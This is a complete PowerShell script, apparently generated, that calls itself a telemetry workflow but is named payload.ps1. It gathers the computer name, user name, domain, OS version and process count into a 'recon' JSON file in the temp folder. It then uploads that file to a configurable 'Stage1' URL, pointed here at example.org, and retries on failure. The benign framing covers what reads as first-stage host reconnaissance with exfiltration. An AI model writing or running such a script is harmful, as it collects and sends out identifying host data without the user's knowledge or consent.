
<#
.SYNOPSIS
    Telemetry collection and HTTP upload workflow.

.DESCRIPTION
    Builds a compact host profile from environment variables and
    operating-system metadata, writes it as JSON and uploads it
    with a bounded retry loop.

.NOTES
    Only host metadata is included.

.EXAMPLE
    PS> .\payload.ps1
#>
[CmdletBinding()]
param(
    [string]$Stage1Url = "https://example.org:443/upload",
    [string]$ReportPath = "$env:TEMP\recon.json",
    [string]$ActivityLog = "$env:TEMP\telemetry.json",
    [int]$TimeoutSec = 124
)
$ErrorActionPreference = "Stop"

# Diagnostics
function Write-StageLog {
    param(
        [string]$Message = ""
    )

    Write-Verbose $Message
    Add-Content -Path $ActivityLog -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Profile
function Get-SystemProfile {
    $Profile = [ordered]@{
        ComputerName = $env:COMPUTERNAME
        UserName = $env:USERNAME
        Domain = $env:USERDOMAIN
        OSVersion = [Environment]::OSVersion.VersionString
        ProcessCount = (Get-Process).Count
    }
    return $Profile
}

# Uploader
function Send-StageReport {
    [CmdletBinding()]
    param(
        [string]$EndpointUrl = "",
        [string]$BodyPath = "",
        [int]$RetryCount = 3
    )

    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
        try {
            $Body = Get-Content -Path $BodyPath -Raw
            return Invoke-RestMethod -Uri $EndpointUrl -Method Post -Body $Body -ContentType "application/json" -TimeoutSec 124
        }
        catch {
            Write-Verbose ("Upload attempt " + $Attempt + " failed")
            Start-Sleep -Seconds 3
        }
    }
    return $null
}

try {
    Write-StageLog -Message "Starting telemetry upload"
    $ResultObject = Get-SystemProfile
    $ResultObject | ConvertTo-Json -Depth 3 | Out-File -FilePath $ReportPath
    $UploadResult = Send-StageReport -EndpointUrl $Stage1Url -BodyPath $ReportPath -RetryCount 3
    Write-StageLog -Message ("Upload result: " + $UploadResult)
}
catch {
    Write-Warning "Telemetry workflow failed: $($_.Exception.Message)"
}

$TelemetryReport = [ordered]@{
    Stage = "upload"
    Endpoint = $Stage1Url
    ReportPath = $ReportPath
    TimeoutSec = $TimeoutSec
}
$TelemetryReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $ActivityLog -Append
Write-Verbose "Resolving configured target"
Write-Verbose "Applying operation timeout"
Write-Verbose "Reading configuration values"
Write-Verbose "Retry budget remaining"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Stage handoff finished"
Write-Verbose "Validating result"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "stage marker 44 reached"
